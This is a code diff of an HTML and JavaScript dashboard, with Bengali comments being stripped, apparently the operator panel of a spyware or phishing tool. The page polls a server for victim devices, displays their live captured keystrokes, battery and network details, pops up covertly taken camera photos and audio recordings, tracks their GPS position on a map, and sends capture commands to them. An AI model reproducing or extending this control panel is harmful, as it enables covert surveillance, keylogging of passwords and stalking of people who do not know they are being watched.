@@ -13,8 +13,6 @@
         #map { height: 100%; width: 100%; }
         .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
-        
-        /* ডিভাইস কার্ড স্টাইল */
         .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
         .device-card:hover { background: #1e293b; transform: scale(1.01); }
         .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
@@ -23,14 +21,12 @@
         .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
         
-        /* বাটন স্টাইল */
         .action-btns { display: flex; gap: 10px; margin-top: 10px; }
         .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
         .btn:hover { opacity: 0.8; }
         .btn-capture { background: #ef4444; }
         .btn-audio { background: #8b5cf6; }
 
-        /* মডাল স্টাইল (ছবি/অডিও দেখার জন্য) */
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
         .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; text-align: center; }
         .modal-content img { max-width: 100%; max-height: 60vh; border-radius: 5px; background: black; margin-bottom: 15px; display: none; }
@@ -52,7 +48,6 @@
         </div>
     </div>
 
-    <!-- মিডিয়া দেখার মডাল -->
     <div id="mediaModal" class="modal">
         <div class="modal-content">
             <h3 id="modalTitle" style="margin-bottom: 10px; color: #38bdf8;">মিডিয়া ফাইল</h3>
@@ -65,7 +60,6 @@
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // ম্যাপ ইনিশিয়ালাইজ
         let map = L.map('map').setView([23.8103, 90.4125], 12);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '&copy; OpenStreetMap'
@@ -76,7 +70,6 @@
         let lastImgTime = {};
         let lastAudTime = {};
 
-        // ডেটা ফেচ এবং রেন্ডার করার ফাংশন
         function fetchClients() {
             fetch('/api/clients')
                 .then(res => res.json())
@@ -95,21 +88,18 @@
                         const card = document.createElement('div');
                         card.className = 'device-card online';
                         
-                        // কার্ডে ক্লিক করলে ম্যাপ সেই লোকেশনে যাবে
                         card.onclick = () => {
                             if (data.lat && data.lng) {
                                 map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
                             }
                         };
                         
-                        // কার্ডের ভেতরের HTML
                         card.innerHTML = `
                             <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
                             <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
                             <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b> (${data.charging || 'N/A'})</div>
                             <div class="detail">📶 নেটওয়ার্ক: <b>${data.network || 'N/A'}</b></div>
                             
-                            <!-- লাইভ টাইপিং সেকশন -->
                             <div class="detail" style="margin-top:10px; padding:10px; background:#334155; border-radius:5px; border-left: 3px solid #facc15;">
                                 <span style="color:#facc15; font-size:12px;">⌨️ টাইপিং:</span><br>
                                 <b style="color:#fff; word-break: break-all;">${data.keystrokes || 'কিছু টাইপ করা হয়নি...'}</b>
@@ -126,18 +116,15 @@
                         `;
                         list.appendChild(card);
 
-                        // নতুন ছবি এলে পপআপ দেখানো
                         if (data.camera_image && data.camera_time && lastImgTime[id] !== data.camera_time) {
                             lastImgTime[id] = data.camera_time;
                             showMedia('image', data.camera_image);
                         }
-                        // নতুন অডিও এলে পপআপ দেখানো
                         if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
                             lastAudTime[id] = data.audio_time;
                             showMedia('audio', data.audio_data);
                         }
 
-                        // ম্যাপে মার্কার আপডেট
                         if (data.lat && data.lng) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             if (markers[id]) {
@@ -153,7 +140,6 @@
                 .catch(err => console.error("Fetch error:", err));
         }
 
-        // কমান্ড পাঠানোর ফাংশন
         function sendCommand(clientId, command) {
             fetch('/api/command', {
                 method: 'POST',
@@ -172,7 +158,6 @@
             .catch(err => console.error("Command error:", err));
         }
 
-        // মিডিয়া পপআপ দেখানোর ফাংশন
         function showMedia(type, src) {
             const modal = document.getElementById('mediaModal');
             const img = document.getElementById('modalImage');
@@ -195,13 +180,11 @@
             modal.style.display = 'flex';
         }
 
-        // মডাল বন্ধ করার ফাংশন
         function closeModal() {
             document.getElementById('mediaModal').style.display = 'none';
             document.getElementById('modalAudio').pause();
         }
 
-        // প্রথমবার কল এবং প্রতি ২ সেকেন্ডে চেক
         fetchClients();
         setInterval(fetchClients, 2000);
     </script>
